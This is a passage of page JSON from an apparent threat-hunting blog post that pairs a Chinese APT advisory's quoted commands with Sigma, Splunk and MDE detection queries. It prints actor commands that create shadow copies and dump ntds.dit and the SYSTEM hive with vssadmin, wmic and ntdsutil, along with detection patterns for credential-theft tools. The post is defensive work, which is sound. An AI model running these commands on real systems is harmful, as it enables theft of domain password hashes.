Software","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_81":{"__typename":"Paragraph","id":"dcff7a17d5b3_81","name":"3fb0","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FLOLBAS Chinese APT Credential Theft Query Registry Software.yml at main ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":211,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FLOLBAS%20Chinese%20APT%20Credential%20Theft%20Query%20Registry%20Software.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":86,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":87,"end":201,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FLOLBAS%20Chinese%20APT%20Credential%20Theft%20Query%20Registry%20Software.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*IZiOcqYxDDJ-W5KX"}},"Paragraph:dcff7a17d5b3_82":{"__typename":"Paragraph","id":"dcff7a17d5b3_82","name":"ec04","type":"P","href":null,"layout":null,"metadata":null,"text":"Sigma Rule — LOLBAS Chinese APT Credential Theft Save Registry SAM and SYSTEM","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_83":{"__typename":"Paragraph","id":"dcff7a17d5b3_83","name":"110e","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FLOLBAS Chinese APT Credential Theft Save Registry SAM and System.yml at main ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":216,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FLOLBAS%20Chinese%20APT%20Credential%20Theft%20Save%20Registry%20SAM%20and%20System.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":91,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":92,"end":206,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FLOLBAS%20Chinese%20APT%20Credential%20Theft%20Save%20Registry%20SAM%20and%20System.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*bLHSs5qebiOXGw0G"}},"Paragraph:dcff7a17d5b3_84":{"__typename":"Paragraph","id":"dcff7a17d5b3_84","name":"adf6","type":"H4","href":null,"layout":null,"metadata":null,"text":"systeminfo","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_85":{"__typename":"Paragraph","id":"dcff7a17d5b3_85","name":"2e54","type":"P","href":null,"layout":null,"metadata":null,"text":"Sigma Rule — Hunting Query Chinese APT Enumeration of the Environment","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_86":{"__typename":"Paragraph","id":"dcff7a17d5b3_86","name":"cd4a","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FHunting Query Chinese APT Enumeration of the Environment.yml at main ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":208,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FHunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":83,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":84,"end":198,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FHunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*lob0zTD2WQ3Ong9P"}},"Paragraph:dcff7a17d5b3_87":{"__typename":"Paragraph","id":"dcff7a17d5b3_87","name":"a873","type":"H4","href":null,"layout":null,"metadata":null,"text":"tasklist","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_88":{"__typename":"Paragraph","id":"dcff7a17d5b3_88","name":"b8aa","type":"P","href":null,"layout":null,"metadata":null,"text":"Sigma Rule — Hunting Query Chinese APT Enumeration of the Environment","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_89":{"__typename":"Paragraph","id":"dcff7a17d5b3_89","name":"3e98","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FHunting Query Chinese APT Enumeration of the Environment.yml at main ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":208,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FHunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":83,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":84,"end":198,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FHunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*lob0zTD2WQ3Ong9P"}},"Paragraph:dcff7a17d5b3_90":{"__typename":"Paragraph","id":"dcff7a17d5b3_90","name":"75b2","type":"H4","href":null,"layout":null,"metadata":null,"text":"wevtutil","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_91":{"__typename":"Paragraph","id":"dcff7a17d5b3_91","name":"f1bd","type":"P","href":null,"layout":null,"metadata":null,"text":"Sigma Rule — Hunting Query Chinese APT Enumeration of the Environment","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_92":{"__typename":"Paragraph","id":"dcff7a17d5b3_92","name":"0b7f","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FHunting Query Chinese APT Enumeration of the Environment.yml at main ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":208,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FHunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":83,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":84,"end":198,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FHunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*lob0zTD2WQ3Ong9P"}},"Paragraph:dcff7a17d5b3_93":{"__typename":"Paragraph","id":"dcff7a17d5b3_93","name":"a81d","type":"H4","href":null,"layout":null,"metadata":null,"text":"Windows Management Instrumentation WMI\u002FWMIC","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_94":{"__typename":"Paragraph","id":"dcff7a17d5b3_94","name":"032f","type":"P","href":null,"layout":null,"metadata":null,"text":"Windows management instrumentation (WMI\u002FWMIC) The actor has executed the following command to gather information about local drives [T1082]:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_95":{"__typename":"Paragraph","id":"dcff7a17d5b3_95","name":"0560","type":"PRE","href":null,"layout":null,"metadata":null,"text":"cmd.exe \u002FC “wmic path win32_logicaldisk get caption,filesystem,freespace,size,volumename”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_96":{"__typename":"Paragraph","id":"dcff7a17d5b3_96","name":"222b","type":"BQ","href":null,"layout":null,"metadata":null,"text":"This command does not require administrative credentials to return results. The command uses a command prompt [T1059.003] to execute a Windows Management Instrumentation Command Line (WMIC) query, collecting information about the storage devices on the local host, including drive letter, file system (e.g., new technology file system [NTFS]), free space and drive size in bytes, and an optional volume name. Windows Management Instrumentation (WMI) is a built-in Windows tool that allows a user to access management information from hosts in an enterprise environment. The command line version of WMI is called WMIC. By default, WMI Tracing is not enabled, so the WMI commands being executed and the associated user might not be available. Additional information on WMI events and tracing can be found in the References section of the advisory.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_97":{"__typename":"Paragraph","id":"dcff7a17d5b3_97","name":"9770","type":"H4","href":null,"layout":null,"metadata":null,"text":"Ntdsutil.exe","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_98":{"__typename":"Paragraph","id":"dcff7a17d5b3_98","name":"7685","type":"BQ","href":null,"layout":null,"metadata":null,"text":"The actor may try to exfiltrate the ntds.dit file and the SYSTEM registry hive from Windows domain controllers (DCs) out of the network to perform password cracking [T1003.003]. (The ntds.dit file is the main Active Directory (AD) database file and, by default, is stored at %SystemRoot%\\NTDS\\ntds.dit. This file contains information about users, groups, group memberships, and password hashes for all users in the domain; the SYSTEM registry hive contains the boot key that is used to encrypt information in the ntds.dit file.) Although the ntds.dit file is locked while in use by AD, a copy can be made by creating a Volume Shadow Copy and extracting the ntds.dit file from the Shadow Copy. The SYSTEM registry hive may also be obtained from the Shadow Copy. The following example commands show the actor creating a Shadow Copy and then extracting a copy of the ntds.dit file from it","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":275,"end":301,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_99":{"__typename":"Paragraph","id":"dcff7a17d5b3_99","name":"3251","type":"PRE","href":null,"layout":null,"metadata":null,"text":"cmd \u002Fc vssadmin create shadow \u002Ffor=C: \u003E C:\\Windows\\Temp\\.tmp","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_100":{"__typename":"Paragraph","id":"dcff7a17d5b3_100","name":"7ecb","type":"PRE","href":null,"layout":null,"metadata":null,"text":"cmd \u002Fc copy","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_101":{"__typename":"Paragraph","id":"dcff7a17d5b3_101","name":"b0e9","type":"PRE","href":null,"layout":null,"metadata":null,"text":"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\NTD S\\ntds.dit C:\\Windows\\Temp \u003E C:\\Windows\\Temp\\.tmp","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_102":{"__typename":"Paragraph","id":"dcff7a17d5b3_102","name":"75fd","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"sigma\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_susp_shadow_copies_creation.yml at master ·…\nMain Sigma Rule Repository. Contribute to SigmaHQ\u002Fsigma development by creating an account on GitHub.github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":211,"href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_susp_shadow_copies_creation.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":99,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":100,"end":201,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_susp_shadow_copies_creation.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*_PcVY711fO-7GZfD"}},"Paragraph:dcff7a17d5b3_103":{"__typename":"Paragraph","id":"dcff7a17d5b3_103","name":"f497","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_104":{"__typename":"Paragraph","id":"dcff7a17d5b3_104","name":"a2ac","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND (((Image=”*\\\\powershell.exe” OR Image=”*\\\\pwsh.exe” OR Image=”*\\\\wmic.exe” OR Image=”*\\\\vssadmin.exe”) OR (OriginalFileName=”PowerShell.EXE” OR OriginalFileName=”pwsh.dll” OR OriginalFileName=”wmic.exe” OR OriginalFileName=”VSSADMIN.EXE”)) AND ((CommandLine=”*shadow*”) AND (CommandLine=”*create*”)))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_105":{"__typename":"Paragraph","id":"dcff7a17d5b3_105","name":"b7b4","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_106":{"__typename":"Paragraph","id":"dcff7a17d5b3_106","name":"16b4","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where (((FolderPath endswith @’\\powershell.exe’ or FolderPath endswith @’\\pwsh.exe’ or FolderPath endswith @’\\wmic.exe’ or FolderPath endswith @’\\vssadmin.exe’) or InitiatingProcessVersionInfoOriginalFileName in~ (@’PowerShell.EXE’, @’pwsh.dll’, @’wmic.exe’, @’VSSADMIN.EXE’) or ProcessVersionInfoOriginalFileName in~ (@’PowerShell.EXE’, @’pwsh.dll’, @’wmic.exe’, @’VSSADMIN.EXE’)) and (ProcessCommandLine contains @’shadow’ and ProcessCommandLine contains @’create’))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_107":{"__typename":"Paragraph","id":"dcff7a17d5b3_107","name":"36ba","type":"BQ","href":null,"layout":null,"metadata":null,"text":"The built-in Ntdsutil.exe tool performs all these actions using a single command. There are several ways to execute Ntdsutil.exe, including running from an elevated command prompt (cmd.exe), using WMI\u002FWMIC, or PowerShell. Defenders should look for the execution of Ntdsutil.exe commands using long, short, or a combination of the notations. For example, the long notation command activate instance ntds ifm can also be executed using the short notation ac i ntds i. Table 1 provides the long and short forms of the arguments used in the sample Ntdsutil.exe command, along with a brief description of the arguments.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":156,"end":179,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":398,"end":406,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":453,"end":465,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_108":{"__typename":"Paragraph","id":"dcff7a17d5b3_108","name":"aba2","type":"H4","href":null,"layout":null,"metadata":null,"text":"ntdsutil and wmic","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_109":{"__typename":"Paragraph","id":"dcff7a17d5b3_109","name":"b287","type":"BQ","href":null,"layout":null,"metadata":null,"text":"The actor has executed WMIC commands [T1047] to create a copy of the ntds.dit file and SYSTEM registry hive using ntdsutil.exe. Each of the following actor commands is a standalone example; multiple examples are provided to show how syntax and file paths may differ per environment.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_110":{"__typename":"Paragraph","id":"dcff7a17d5b3_110","name":"d81c","type":"PRE","href":null,"layout":null,"metadata":null,"text":"wmic process call create “ntdsutil \\”ac i ntds\\” ifm \\”create full C:\\Windows\\Temp\\pro","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_111":{"__typename":"Paragraph","id":"dcff7a17d5b3_111","name":"cfab","type":"PRE","href":null,"layout":null,"metadata":null,"text":"wmic process call create “cmd.exe \u002Fc ntdsutil \\”ac i ntds\\” ifm \\”create full C:\\Windows\\Temp\\Pro”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_112":{"__typename":"Paragraph","id":"dcff7a17d5b3_112","name":"5f87","type":"PRE","href":null,"layout":null,"metadata":null,"text":"wmic process call create “cmd.exe \u002Fc mkdir C:\\Windows\\Temp\\tmp & ntdsutil \\”ac i ntds\\” ifm \\”create full C:\\Windows\\Temp\\tmp\\”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_113":{"__typename":"Paragraph","id":"dcff7a17d5b3_113","name":"6b3c","type":"PRE","href":null,"layout":null,"metadata":null,"text":"“cmd.exe” \u002Fc wmic process call create “cmd.exe \u002Fc mkdir C:\\windows\\Temp\\McAfee_Logs & ntdsutil \\”ac i ntds\\” ifm \\”create full C:\\Windows\\Temp\\McAfee_Logs\\”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_114":{"__typename":"Paragraph","id":"dcff7a17d5b3_114","name":"b384","type":"PRE","href":null,"layout":null,"metadata":null,"text":"cmd.exe \u002FQ \u002Fc wmic process call create “cmd.exe \u002Fc mkdir C:\\Windows\\Temp\\tmp & ntdsutil \\”ac i ntds\\” ifm \\”create full C:\\Windows\\Temp\\tmp\\” 1\u003E \\\\127.0.0.1\\ADMIN$\\ 2\u003E&1","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_115":{"__typename":"Paragraph","id":"dcff7a17d5b3_115","name":"6962","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"sigma\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_susp_ntds.yml at master · SigmaHQ\u002Fsigma\nMain Sigma Rule Repository. Contribute to SigmaHQ\u002Fsigma development by creating an account on GitHub.github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":206,"href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_susp_ntds.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":94,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":95,"end":196,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fprocess_creation\u002Fproc_creation_win_susp_ntds.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*TipAYxa5r0GX_oyy"}},"Paragraph:dcff7a17d5b3_116":{"__typename":"Paragraph","id":"dcff7a17d5b3_116","name":"0d59","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_117":{"__typename":"Paragraph","id":"dcff7a17d5b3_117","name":"6f8b","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceProcessEvents | where ((((FolderPath endswith @’\\NTDSDump.exe’ or FolderPath endswith @’\\NTDSDumpEx.exe’) or (ProcessCommandLine contains @’ntds.dit’ and ProcessCommandLine contains @’system.hiv’) or ProcessCommandLine contains @’NTDSgrab.ps1') or (ProcessCommandLine contains @’ac i ntds’ and ProcessCommandLine contains @’create full’) or (ProcessCommandLine contains @’\u002Fc copy ‘ and ProcessCommandLine contains @’\\windows\\ntds\\ntds.dit’) or (ProcessCommandLine contains @’activate instance ntds’ and ProcessCommandLine contains @’create full’) or (ProcessCommandLine contains @’powershell’ and ProcessCommandLine contains @’ntds.dit’)) or (ProcessCommandLine contains @’ntds.dit’ and ((InitiatingProcessFolderPath contains @’\\apache’ or InitiatingProcessFolderPath contains @’\\tomcat’ or InitiatingProcessFolderPath contains @’\\AppData\\’ or InitiatingProcessFolderPath contains @’\\Temp\\’ or InitiatingProcessFolderPath contains @’\\Public\\’ or InitiatingProcessFolderPath contains @’\\PerfLogs\\’) or (FolderPath contains @’\\apache’ or FolderPath contains @’\\tomcat’ or FolderPath contains @’\\AppData\\’ or FolderPath contains @’\\Temp\\’ or FolderPath contains @’\\Public\\’ or FolderPath contains @’\\PerfLogs\\’))))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_118":{"__typename":"Paragraph","id":"dcff7a17d5b3_118","name":"6cc3","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_119":{"__typename":"Paragraph","id":"dcff7a17d5b3_119","name":"9205","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND ((((Image=”*\\\\NTDSDump.exe” OR Image=”*\\\\NTDSDumpEx.exe”) OR ((CommandLine=”*ntds.dit*”) AND (CommandLine=”*system.hiv*”)) OR CommandLine=”*NTDSgrab.ps1*”) OR ((CommandLine=”*ac i ntds*”) AND (CommandLine=”*create full*”)) OR ((CommandLine=”*\u002Fc copy *”) AND (CommandLine=”*\\\\windows\\\\ntds\\\\ntds.dit*”)) OR ((CommandLine=”*activate instance ntds*”) AND (CommandLine=”*create full*”)) OR ((CommandLine=”*powershell*”) AND (CommandLine=”*ntds.dit*”))) OR (CommandLine=”*ntds.dit*” AND ((ParentImage=”*\\\\apache*” OR ParentImage=”*\\\\tomcat*” OR ParentImage=”*\\\\AppData\\\\*” OR ParentImage=”*\\\\Temp\\\\*” OR ParentImage=”*\\\\Public\\\\*” OR ParentImage=”*\\\\PerfLogs\\\\*”) OR (Image=”*\\\\apache*” OR Image=”*\\\\tomcat*” OR Image=”*\\\\AppData\\\\*” OR Image=”*\\\\Temp\\\\*” OR Image=”*\\\\Public\\\\*” OR Image=”*\\\\PerfLogs\\\\*”))))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_120":{"__typename":"Paragraph","id":"dcff7a17d5b3_120","name":"1dd9","type":"P","href":null,"layout":null,"metadata":null,"text":"Note: The would be an epoch timestamp following the format like “__1684956600.123456”. Each actor command above creates a copy of the ntds.dit database and the SYSTEM and SECURITY registry hives in the C:\\Windows\\Temp\\ directory, where is replaced with the path specified in the command (e.g., pro, tmp, or McAfee_Logs). By default, the hidden ADMIN$ share is mapped to C:\\Windows\\, so the last command will direct standard output and error messages from the command to a file within the folder specified. The actor has also saved the files directly to the C:\\Windows\\Temp and C:\\Users\\Public directories, so the entirety of those directory structures should be analyzed.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":64,"end":86,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":202,"end":219,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":370,"end":382,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":557,"end":572,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":577,"end":592,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_121":{"__typename":"Paragraph","id":"dcff7a17d5b3_121","name":"d553","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"sigma\u002Frules\u002Fwindows\u002Ffile\u002Ffile_event\u002Ffile_event_win_ntds_dit_uncommon_parent_process.yml at master ·…\nMain Sigma Rule Repository. Contribute to SigmaHQ\u002Fsigma development by creating an account on GitHub.github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":212,"href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Ffile\u002Ffile_event\u002Ffile_event_win_ntds_dit_uncommon_parent_process.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":100,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":101,"end":202,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Ffile\u002Ffile_event\u002Ffile_event_win_ntds_dit_uncommon_parent_process.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*ffWrCTwLo0qk9q2t"}},"Paragraph:dcff7a17d5b3_122":{"__typename":"Paragraph","id":"dcf